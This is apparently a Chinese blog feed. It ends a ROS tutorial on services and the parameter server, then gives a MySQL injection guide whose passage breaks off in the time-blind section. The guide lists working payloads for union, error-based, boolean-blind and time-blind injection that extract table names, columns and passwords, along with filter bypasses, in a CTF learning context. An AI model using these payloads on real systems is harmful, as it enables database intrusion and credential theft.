        <span class="n">rospy</span><span class="p">.</span><span class="nf">logerr</span><span class="p">(</span><span class="sh">"</span><span class="s">请正确提交参数</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">rospy</span><span class="p">.</span><span class="nf">init_node</span><span class="p">(</span><span class="sh">"</span><span class="s">pyclient</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">client</span><span class="o">=</span><span class="n">rospy</span><span class="p">.</span><span class="nc">ServiceProxy</span><span class="p">(</span><span class="sh">"</span><span class="s">addint</span><span class="sh">"</span><span class="p">,</span><span class="n">addint</span><span class="p">)</span>
    <span class="n">client</span><span class="p">.</span><span class="nf">wait_for_service</span><span class="p">()</span>
    <span class="n">req</span><span class="o">=</span><span class="nf">addintRequest</span><span class="p">()</span>
    <span class="n">req</span><span class="p">.</span><span class="n">num1</span><span class="o">=</span><span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
    <span class="n">req</span><span class="p">.</span><span class="n">num2</span><span class="o">=</span><span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="n">response</span><span class="o">=</span><span class="n">client</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">num1</span><span class="p">,</span><span class="n">req</span><span class="p">.</span><span class="n">num2</span><span class="p">)</span>
    <span class="n">rospy</span><span class="p">.</span><span class="nf">loginfo</span><span class="p">(</span><span class="sh">"</span><span class="s">收到回复:%d</span><span class="sh">"</span><span class="p">,</span><span class="n">response</span><span class="p">.</span><span class="nb">sum</span><span class="p">)</span>
</code></pre></div></div> <hr/> <h2 id="三参数服务器">三、参数服务器</h2> <p>参数服务器就是一个存放参数的容器，相当于全局变量的设置。</p> <h3 id="设置参数c">设置参数（C++）</h3> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"ros/ros.h"</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span><span class="n">argv</span><span class="p">,</span><span class="s">"setnode"</span><span class="p">);</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">NodeHandle</span> <span class="n">nh</span><span class="p">;</span>
    <span class="n">nh</span><span class="p">.</span><span class="n">setParam</span><span class="p">(</span><span class="s">"type"</span><span class="p">,</span><span class="s">"xiaohua"</span><span class="p">);</span>
    <span class="n">nh</span><span class="p">.</span><span class="n">setParam</span><span class="p">(</span><span class="s">"radiu"</span><span class="p">,</span><span class="mf">0.5</span><span class="p">);</span>
    <span class="n">nh</span><span class="p">.</span><span class="n">setParam</span><span class="p">(</span><span class="s">"radiu"</span><span class="p">,</span><span class="mf">0.7</span><span class="p">);</span><span class="c1">//可直接覆盖</span>
    <span class="c1">//ros::param::set() 另一种可用方法</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h3 id="获取和删除参数c">获取和删除参数（C++）</h3> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"ros/ros.h"</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="n">setlocale</span><span class="p">(</span><span class="n">LC_ALL</span><span class="p">,</span><span class="s">""</span><span class="p">);</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span><span class="n">argv</span><span class="p">,</span><span class="s">"param_get"</span><span class="p">);</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">NodeHandle</span> <span class="n">nh</span><span class="p">;</span>

    <span class="kt">double</span> <span class="n">radiu</span><span class="o">=</span><span class="n">nh</span><span class="p">.</span><span class="n">param</span><span class="p">(</span><span class="s">"radiu"</span><span class="p">,</span><span class="mf">0.5</span><span class="p">);</span>
    <span class="n">ROS_INFO</span><span class="p">(</span><span class="s">"radiu=%.2f"</span><span class="p">,</span><span class="n">radiu</span><span class="p">);</span>

    <span class="c1">// getParam(键,存储结果的变量)</span>
    <span class="c1">//         存在,返回 true,且将值赋值给参数2</span>
    <span class="c1">//         如果键不存在，那么返回值为 false，且不为参数2赋值</span>
    <span class="c1">//     getParamCached键(比getparam更高性能，功能相同)</span>
    <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&gt;</span> <span class="n">names</span><span class="p">;</span>
    <span class="n">nh</span><span class="p">.</span><span class="n">getParamNames</span><span class="p">(</span><span class="n">names</span><span class="p">);</span> <span class="c1">//遍历元素</span>
    <span class="k">for</span> <span class="p">(</span><span class="k">auto</span> <span class="o">&amp;&amp;</span><span class="n">name</span> <span class="o">:</span> <span class="n">names</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">ROS_INFO</span><span class="p">(</span><span class="s">"遍历的元素为：%s"</span><span class="p">,</span><span class="n">name</span><span class="p">.</span><span class="n">c_str</span><span class="p">());</span>
    <span class="p">}</span>

    <span class="kt">bool</span> <span class="n">flag</span><span class="p">;</span>
    <span class="n">flag</span><span class="o">=</span><span class="n">nh</span><span class="p">.</span><span class="n">deleteParam</span><span class="p">(</span><span class="s">"audiu"</span><span class="p">);</span>
    <span class="c1">// deleteParam("键")</span>
    <span class="c1">//     根据键删除参数，删除成功，返回 true，否则(参数不存在)，返回 false</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h3 id="设置参数python">设置参数（Python）</h3> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#! /usr/bin/env python
</span><span class="kn">import</span> <span class="n">rospy</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span><span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">rospy</span><span class="p">.</span><span class="nf">init_node</span><span class="p">(</span><span class="sh">"</span><span class="s">param_set</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">rospy</span><span class="p">.</span><span class="nf">set_param</span><span class="p">(</span><span class="sh">"</span><span class="s">shuzi</span><span class="sh">"</span><span class="p">,</span><span class="mi">10</span><span class="p">)</span>
    <span class="n">rospy</span><span class="p">.</span><span class="nf">set_param</span><span class="p">(</span><span class="sh">"</span><span class="s">xiaoshu</span><span class="sh">"</span><span class="p">,</span><span class="mf">10.5</span><span class="p">)</span>
    <span class="n">rospy</span><span class="p">.</span><span class="nf">set_param</span><span class="p">(</span><span class="sh">"</span><span class="s">shuzi</span><span class="sh">"</span><span class="p">,</span><span class="mi">10</span><span class="p">)</span>
</code></pre></div></div> <h3 id="获取和删除参数python">获取和删除参数（Python）</h3> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#! /usr/bin/env python
</span><span class="kn">import</span> <span class="n">rospy</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">rospy</span><span class="p">.</span><span class="nf">init_node</span><span class="p">(</span><span class="sh">"</span><span class="s">param_get</span><span class="sh">"</span><span class="p">)</span>

    <span class="n">int_value</span><span class="o">=</span><span class="n">rospy</span><span class="p">.</span><span class="nf">get_param</span><span class="p">(</span><span class="sh">"</span><span class="s">shuzi</span><span class="sh">"</span><span class="p">)</span><span class="c1">#获取键值
</span>    <span class="n">double_value</span><span class="o">=</span><span class="n">rospy</span><span class="p">.</span><span class="nf">get_param</span><span class="p">(</span><span class="sh">"</span><span class="s">xiaoshu</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">rospy</span><span class="p">.</span><span class="nf">loginfo</span><span class="p">(</span><span class="sh">"</span><span class="s">intvalue=%d</span><span class="sh">"</span><span class="p">,</span><span class="n">int_value</span><span class="p">)</span>
    <span class="n">rospy</span><span class="p">.</span><span class="nf">loginfo</span><span class="p">(</span><span class="sh">"</span><span class="s">intvalue=%.2f</span><span class="sh">"</span><span class="p">,</span><span class="n">double_value</span><span class="p">)</span>

    <span class="c1">#rospy.get_param_cached()有缓存效率更高
</span>
    <span class="n">names</span><span class="o">=</span><span class="n">rospy</span><span class="p">.</span><span class="nf">get_param_names</span><span class="p">()</span><span class="c1">#获取所有元素
</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">names</span><span class="p">:</span>
        <span class="n">rospy</span><span class="p">.</span><span class="nf">loginfo</span><span class="p">(</span><span class="sh">"</span><span class="s">name=%s</span><span class="sh">"</span><span class="p">,</span><span class="n">i</span><span class="p">)</span>

    <span class="n">flag</span><span class="o">=</span><span class="n">rospy</span><span class="p">.</span><span class="nf">has_param</span><span class="p">(</span><span class="sh">"</span><span class="s">shuzi</span><span class="sh">"</span><span class="p">)</span><span class="c1">#判断是否包含某个键
</span>    <span class="nf">if</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
        <span class="n">rospy</span><span class="p">.</span><span class="nf">loginfo</span><span class="p">(</span><span class="sh">"</span><span class="s">存在</span><span class="sh">"</span><span class="p">)</span>

    <span class="n">shuzi</span><span class="o">=</span><span class="n">rospy</span><span class="p">.</span><span class="nf">search_param</span><span class="p">(</span><span class="sh">"</span><span class="s">shuzi</span><span class="sh">"</span><span class="p">)</span><span class="c1">#查找键
</span>    <span class="n">rospy</span><span class="p">.</span><span class="nf">loginfo</span><span class="p">(</span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="p">,</span><span class="n">shuzi</span><span class="p">)</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">rospy</span><span class="p">.</span><span class="nf">delete_param</span><span class="p">(</span><span class="sh">"</span><span class="s">shuzi</span><span class="sh">"</span><span class="p">)</span><span class="c1">#删除键
</span>    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">rospy</span><span class="p">.</span><span class="nf">loginfo</span><span class="p">(</span><span class="sh">"</span><span class="s">删除失败</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div> <hr/> <h2 id="常用-api">常用 API</h2> <h3 id="初始化">初始化</h3> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// C++</span>
<span class="n">ros</span><span class="o">::</span><span class="n">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span><span class="n">argv</span><span class="p">,</span><span class="s">"name"</span><span class="p">);</span>

<span class="c1">// Python</span>
<span class="n">rospy</span><span class="p">.</span><span class="n">init_node</span><span class="p">(</span><span class="s">"name"</span><span class="p">);</span>
</code></pre></div></div> <h3 id="话题与服务相关对象">话题与服务相关对象</h3> <p>略（具体实现见上述代码示例）</p> <hr/> <h2 id="总结">总结</h2> <p>ROS 提供了三种主要的通信机制：</p> <ol> <li><strong>话题通信（Topic）</strong> - 异步通信，适用于连续数据流</li> <li><strong>服务通信（Service）</strong> - 同步通信，适用于请求/响应模式</li> <li><strong>参数服务器（Parameter Server）</strong> - 全局参数存储</li> </ol> <p>掌握这三种通信机制是 ROS 开发的基础，后续的机器人开发都是基于这些通信机制实现的。</p>]]></content><author><name></name></author><category term="ROS"/><category term="ROS"/><category term="机器人"/><category term="入门"/><category term="教程"/><summary type="html"><![CDATA[ROS 机器人操作系统基础入门，包括环境搭建、通信机制（话题、服务、参数服务器）等]]></summary></entry><entry><title type="html">MySQL 注入完整指南</title><link href="https://gewenhao.win/blog/2023/MySQL%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/" rel="alternate" type="text/html" title="MySQL 注入完整指南"/><published>2023-08-15T14:00:00+00:00</published><updated>2023-08-15T14:00:00+00:00</updated><id>https://gewenhao.win/blog/2023/MySQL%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97</id><content type="html" xml:base="https://gewenhao.win/blog/2023/MySQL%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/"><![CDATA[<h1 id="mysql-注入完整指南">MySQL 注入完整指南</h1> <h2 id="什么是-sql-注入">什么是 SQL 注入</h2> <p>SQL 注入是一种将 SQL 代码插入或添加到应用的输入参数中的攻击，之后再将这些参数传递给后台的 SQL 服务加以解析并执行。</p> <p>凡是构造 SQL 语句的步骤均存在被潜在攻击的风险。SQL 注入的主要方式是直接将代码插入参数中，这些参数会被置入 SQL 命令中加以执行。</p> <p>SQL 注入产生的条件：用户控制了 SQL 语句的一部分，用户的输入不再是一个输入参数，而成为了符合语法的 SQL 语句。</p> <h2 id="sql-注入的类型">SQL 注入的类型</h2> <p><strong>按数据结构划分：</strong></p> <ul> <li>数字型：<code class="language-plaintext highlighter-rouge">"select * from product where id = ". $_GET['id']</code></li> <li>字符型：<code class="language-plaintext highlighter-rouge">"select * from person_info where username='" . $_GET['name']."'"</code></li> </ul> <p><strong>按回显方式划分：</strong></p> <p><strong>有回显：</strong></p> <ul> <li>联合查询 -&gt; 构造联合查询语句，直接查看查询结果</li> <li>报错注入 -&gt; 构造报错语句，在报错中查看结果</li> <li>堆查询 -&gt; 多行语句执行，进而实现想要达到的目的</li> </ul> <p><strong>无回显：</strong></p> <ul> <li>盲注 -&gt; 布尔型/时间型 通过某种手段”爆破”结果</li> </ul> <hr/> <h2 id="一联合查询注入">一、联合查询注入</h2> <h3 id="1-判断是否存在注入字符型还是数字型">1. 判断是否存在注入，字符型还是数字型</h3> <p><strong>整数型：</strong> <code class="language-plaintext highlighter-rouge">1 and 1=1</code>（正确）<code class="language-plaintext highlighter-rouge">1 and 1=2</code>（错误）</p> <p><strong>字符型：</strong> <code class="language-plaintext highlighter-rouge">1' and 1=1 --+</code>（正确）<code class="language-plaintext highlighter-rouge">1' and 1=2 --+</code>（错误）</p> <p>注：<code class="language-plaintext highlighter-rouge">--+</code> 为注释可用 <code class="language-plaintext highlighter-rouge">--</code>（空格）或者 <code class="language-plaintext highlighter-rouge">#</code> 代替</p> <h3 id="2-猜解-sql-查询语句中的字段数">2. 猜解 SQL 查询语句中的字段数</h3> <p>使用后面拼接 <code class="language-plaintext highlighter-rouge">order by</code>（数字）<code class="language-plaintext highlighter-rouge">#</code> 进行猜解</p> <h3 id="3-确定显示的字段顺序">3. 确定显示的字段顺序</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' union select 1,2 #
</span></code></pre></div></div> <h3 id="4-获取当前数据库的表名">4. 获取当前数据库的表名</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
</span></code></pre></div></div> <p><strong>group_concat()</strong>: 用于将输出合并到一行</p> <p>group_concat() 被屏蔽时可使用 limit 进行逐行输出</p> <h3 id="5-获取表中字段名">5. 获取表中字段名</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' union select 1,group_concat(column_name) from information_schema.columns where table_name='</span><span class="n">users</span><span class="s1">' #
</span></code></pre></div></div> <h3 id="6-获取字段内容">6. 获取字段内容</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' union select 1,2,group_concat(password) from ctfshow_user2
</span></code></pre></div></div> <h3 id="补充获取数据库名">补充：获取数据库名</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' union select 1,2,group_concat(schema_name) from information_schema.schemata
</span></code></pre></div></div> <hr/> <h2 id="二报错注入">二、报错注入</h2> <h3 id="一般前提union-被过滤时">一般前提：union 被过滤时</h3> <h3 id="exp">exp()</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">exp</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">())</span><span class="n">a</span><span class="p">))</span>
<span class="o">#</span> <span class="o">~</span><span class="err">符号为运算符，意思为一元字符反转</span>
<span class="n">exp</span><span class="p">(</span><span class="mi">710</span><span class="o">-</span><span class="p">(</span><span class="err">表达式</span><span class="p">))</span><span class="o">#</span><span class="err">真不报错，假报错</span>
</code></pre></div></div> <p>适用版本：5.5.5~5.5.49</p> <p>还有类似的函数如 pow(), abs(), cot()：</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pow</span><span class="p">(</span><span class="mi">1</span><span class="o">+</span><span class="p">(</span><span class="err">表达式</span><span class="p">),</span><span class="mi">99999999999</span><span class="p">)</span>
<span class="n">cot</span><span class="p">(</span><span class="err">表达式</span><span class="p">)</span>
</code></pre></div></div> <h3 id="updatexml">updatexml</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="k">user</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span>
<span class="o">#</span><span class="mi">0</span><span class="n">x7e</span><span class="err">为</span><span class="o">~</span>
<span class="o">#</span><span class="err">使用版本</span><span class="mi">5</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">5</span><span class="o">+</span>
</code></pre></div></div> <h3 id="extractvalue">extractvalue</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="k">user</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span>
</code></pre></div></div> <h3 id="randgroupcount">rand()+group()+count()</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="mi">2</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="s1">':'</span><span class="p">,(</span><span class="k">select</span> <span class="k">database</span><span class="p">()),</span><span class="s1">':'</span><span class="p">,</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">()</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="k">as</span> <span class="n">a</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">group</span> <span class="k">by</span> <span class="n">a</span><span class="p">;</span>
</code></pre></div></div> <h3 id="几何函数">几何函数</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">GeometryCollection</span><span class="err">：</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">GeometryCollection</span><span class="p">((</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span><span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">())</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="p">))</span>
<span class="n">polygon</span><span class="p">()</span><span class="err">：</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">polygon</span><span class="p">((</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">())</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="p">))</span>
<span class="n">multipoint</span><span class="p">()</span><span class="err">：</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">multipoint</span><span class="p">((</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">())</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="p">))</span>
<span class="n">multilinestring</span><span class="p">()</span><span class="err">：</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">multilinestring</span><span class="p">((</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">())</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="p">))</span>
<span class="n">linestring</span><span class="p">()</span><span class="err">：</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">LINESTRING</span><span class="p">((</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">())</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="p">))</span>
<span class="n">multipolygon</span><span class="p">()</span><span class="err">：</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">multipolygon</span><span class="p">((</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">())</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="p">))</span>
</code></pre></div></div> <hr/> <h2 id="三布尔盲注">三、布尔盲注</h2> <h3 id="盲注分类">盲注分类</h3> <p><strong>布尔盲注：</strong> 回显不同</p> <p><strong>时间盲注：</strong> 响应时间不同</p> <h3 id="布尔状态例如">布尔状态例如：</h3> <ul> <li>回显不同（内容、长度）</li> <li>HTTP 响应状态码不同（200、500）</li> <li>HTTP 响应头变化（无条件重定向、设置 cookie）</li> <li>基于错误的布尔注入（MySQL 是否报错）</li> </ul> <h3 id="布尔盲注判断">布尔盲注判断：</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">id</span><span class="o">=</span><span class="mi">2333</span><span class="s1">' and 1=1%23 (正确状态)
id=2333'</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="o">%</span><span class="mi">23</span> <span class="p">(</span><span class="err">错误状态</span><span class="p">)</span>
<span class="n">id</span><span class="o">=</span><span class="mi">2333</span><span class="s1">' and ascii(substring((select database()),1,1))&gt;-1%23 (正确状态)
id=2333'</span> <span class="k">and</span> <span class="n">ascii</span><span class="p">(</span><span class="k">substring</span><span class="p">((</span><span class="k">select</span> <span class="k">database</span><span class="p">()),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">127</span><span class="o">%</span><span class="mi">23</span> <span class="p">(</span><span class="err">错误状态</span><span class="p">)</span>
</code></pre></div></div> <p>注：url 中不能直接使用 &amp;、#，需要使用对应的 url 编码</p> <h3 id="字符串截取方法">字符串截取方法</h3> <ol> <li><strong>substr()与substring()</strong></li> </ol> <p>SUBSTR (str, pos, len) 过滤了逗号时可用 SUBSTR (str FROM pos FOR len) 替代</p> <ol> <li><strong>right()</strong></li> </ol> <p>两个参数，配合 ascii() 可以从右往左逐词爆破</p> <p>ascii() 可用 ord() 代替</p> <ol> <li><strong>left()+reverse()</strong></li> </ol> <p>即：reverse(left(‘abc’,2)) 配合 ascii() 即可从左往右逐词爆破</p> <ol> <li><strong>trim()</strong></li> </ol> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">TRIM</span><span class="p">([</span><span class="k">BOTH</span><span class="o">/</span><span class="k">LEADING</span><span class="o">/</span><span class="k">TRAILING</span><span class="p">]</span> <span class="err">目标字符串</span> <span class="k">FROM</span> <span class="err">源字符串）</span>
<span class="k">select</span> <span class="k">Trim</span><span class="p">(</span><span class="k">leading</span> <span class="s1">'a'</span> <span class="k">from</span> <span class="s1">'abcd'</span><span class="p">)</span> <span class="n">regexp</span> <span class="k">trim</span><span class="p">(</span><span class="k">LEADING</span> <span class="s1">'x'</span> <span class="k">from</span> <span class="s1">'abcd'</span><span class="p">)</span>
<span class="o">#</span><span class="err">返回</span><span class="mi">0</span>
</code></pre></div></div> <ol> <li><strong>insert()</strong></li> </ol> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">insert</span><span class="p">(</span><span class="s1">'abcdef'</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s1">''</span><span class="p">);</span>
<span class="o">#</span><span class="n">bcdef</span>
<span class="k">select</span> <span class="k">insert</span><span class="p">((</span><span class="k">insert</span><span class="p">(</span><span class="s1">'abcdef'</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s1">''</span><span class="p">)),</span><span class="mi">2</span><span class="p">,</span><span class="mi">99999</span><span class="p">,</span><span class="s1">''</span><span class="p">);</span>
<span class="o">#</span><span class="n">a</span>
</code></pre></div></div> <h3 id="比较方法">比较方法</h3> <ol> <li><code class="language-plaintext highlighter-rouge">&gt; &lt; =</code></li> <li><strong>like</strong>：SQL LIKE 子句中使用百分号 % 字符来表示任意字符</li> <li><strong>正则表达式 regexp rlike</strong>：regexp 是不区分大小写的，需要大小写敏感需要加上 binary 关键字</li> <li><strong>between</strong>：<code class="language-plaintext highlighter-rouge">expr [NOT] BETWEEN begin_expr AND end_expr</code></li> <li><strong>in</strong>：加 binary 可变为大小写敏感</li> <li><strong>and / &amp;&amp;</strong>：逻辑与运算符</li> <li> <table> <tbody> <tr> <td>**or /</td> <td> </td> <td>**：逻辑或运算符</td> </tr> </tbody> </table> </li> <li><strong>Xor</strong>：逻辑异或，当 # 与 —+ 被注释时可以考虑</li> <li><strong>order by 比较盲注</strong></li> </ol> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="p">(</span><span class="k">select</span> <span class="s1">'a'</span> <span class="k">union</span> <span class="k">select</span> <span class="n">substr</span><span class="p">(</span><span class="n">group_concat</span><span class="p">(</span><span class="n">password</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="s1">'admin'</span> <span class="k">order</span> <span class="k">by</span> <span class="mi">1</span> <span class="k">limit</span> <span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">'a'</span><span class="p">;</span>
</code></pre></div></div> <hr/> <h2 id="四时间盲注">四、时间盲注</h2> <h3 id="一般使用-sleep-函数">一般使用 Sleep() 函数</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' and sleep(10) --+
#判断有无延时
</span></code></pre></div></div> <h3 id="if-函数">if() 函数</h3> <p>if() 函数有三个参数，其用法为 if(a,b,c)</p> <ul> <li>第一个参数 a：判断语句，返回结果为真假</li> <li>第二个参数 b：如果前面的判断返回为真，则执行 b</li> <li>第三个参数 c：如果前面的判断返回为假，则执行 c</li> </ul> <h3 id="case-函数">case() 函数</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">case</span> <span class="s1">'a'</span> <span class="k">when</span> <span class="s1">'a'</span> <span class="k">then</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">0</span> <span class="k">end</span>
<span class="o">#</span><span class="err">返回</span><span class="mi">1</span>
</code></pre></div></div> <h3 id="过滤了-sleep-时">过滤了 sleep 时</h3> <ol> <li><strong>benchmark</strong></li> </ol> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">benchmark</span><span class="p">(</span><span class="mi">1</span><span class="n">e7</span><span class="p">,</span><span class="n">sha1</span><span class="p">(</span><span class="s1">'gehaotian'</span><span class="p">))</span><span class="o">#</span><span class="err">约要</span><span class="mi">1</span><span class="p">.</span><span class="mi">5</span><span class="err">秒</span>
<span class="k">select</span> <span class="n">benchmark</span><span class="p">(</span><span class="mi">1000000</span><span class="p">,</span><span class="n">md5</span><span class="p">(</span><span class="s1">'gehaotian'</span><span class="p">))</span><span class="o">#</span><span class="err">约要</span><span class="mi">1</span><span class="p">.</span><span class="mi">5</span><span class="err">秒</span>
